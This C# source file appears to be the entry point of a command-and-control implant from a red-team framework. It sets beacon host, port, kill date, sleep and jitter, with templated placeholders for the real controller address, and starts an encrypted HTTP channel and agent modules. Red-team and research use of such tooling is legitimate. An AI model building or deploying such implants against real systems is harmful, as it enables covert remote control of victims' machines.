using Agent.Modules;

using Agent.Controllers;
using Agent.Models;

using System;

namespace Agent
{
    class Agent
    {
        public Agent()
        {
            Execute();
        }

        static void Main(string[] args)
        {
            new Agent();
        }

        static void Execute()
        {
            var config = new ConfigController();
            config.SetOption(ConfigSetting.ConnectHosts, "127.0.0.1");
            config.SetOption(ConfigSetting.ConnectPort, "80");
            config.SetOption(ConfigSetting.KillDate, DateTime.Parse("01/01/2021 00:00:00"));
            config.SetOption(ConfigSetting.SleepInterval, 1);
            config.SetOption(ConfigSetting.SleepJitter, 0);

            //config.SetOption(ConfigSetting.ConnectHosts, "<<ConnectHost>>");
            //config.SetOption(ConfigSetting.ConnectPort, "<<ConnectPort>>");
            //config.SetOption(ConfigSetting.KillDate, DateTime.Parse("<<KillDate>>"));
            //config.SetOption(ConfigSetting.SleepInterval, "<<SleepInterval>>");
            //config.SetOption(ConfigSetting.SleepJitter, "<<SleepJitter>>");

            var crypto = new CryptoController();

            var commModule = new HttpCommModule();
            commModule.Init(config, crypto);

            var agent = new AgentController(config, crypto, commModule);
            agent.Init();
            agent.RegisterAgentModule(new CoreAgentModule());
            agent.Start();
        }
    }
}